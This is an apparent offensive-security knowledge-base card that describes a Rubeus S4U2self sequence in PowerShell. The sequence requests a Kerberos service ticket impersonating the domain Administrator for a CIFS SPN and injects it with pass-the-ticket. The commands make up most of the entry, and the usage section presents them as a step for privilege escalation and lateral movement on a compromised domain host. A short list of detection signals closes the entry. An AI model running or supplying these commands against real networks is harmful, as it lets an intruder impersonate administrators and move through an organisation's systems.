---
id: ed2536ed-3d7f-4159-b226-9e9b4a23e93c
name: Rubeus-S4U2Self-Domain-Admin-Ticket-Sequence
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:07.821249+00:00'
updated_at: '2023-04-10T20:36:07.950743+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - s4u
  - privilege-escalation
validated: true
---

# Rubeus-S4U2Self-Domain-Admin-Ticket-Sequence

## Code

```powershell
Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001.domain.local" /ticket:"base64ticket"
Rubeus.exe ptt /ticket:"base64ticket"

Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001" /ticket:"base64ticket" /ptt
```

## Description

This PowerShell code sequence uses Rubeus to generate an S4U2self ticket impersonating the domain Administrator, inject it via PTT, and then generate/inject another for direct access. It enables quick privilege escalation to admin-level service access on a target server.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| base64ticket | Base64-encoded TGT or intermediate TGS | doIF... (full base64 string) |
| Administrator | User to impersonate | Domain Admin username |
| cifs/srv001.domain.local | Target service SPN (full) | cifs/targetserver.domain.local |
| cifs/srv001 | Target service SPN (short) | cifs/targetserver |

## Usage

Execute in an elevated PowerShell on a compromised domain host with a valid TGT exported as base64. Replace placeholders and run sequentially. After execution, use the impersonated identity for actions like `net use \\srv001\IPC$` or remote execution. Ideal for lateral movement post-initial access.

## Detection

- Monitor Event ID 4769 for S4U ticket requests with unusual impersonation.
- Audit LSA cache changes via `klist` anomalies or Sysmon EID 10 for process injection.
- Network logs showing Kerberos traffic to non-standard services from low-priv accounts.

## Related

- [[procedures/Kerberos-S4U2Self-Privilege-Escalation]]
- [[tools/Rubeus]]
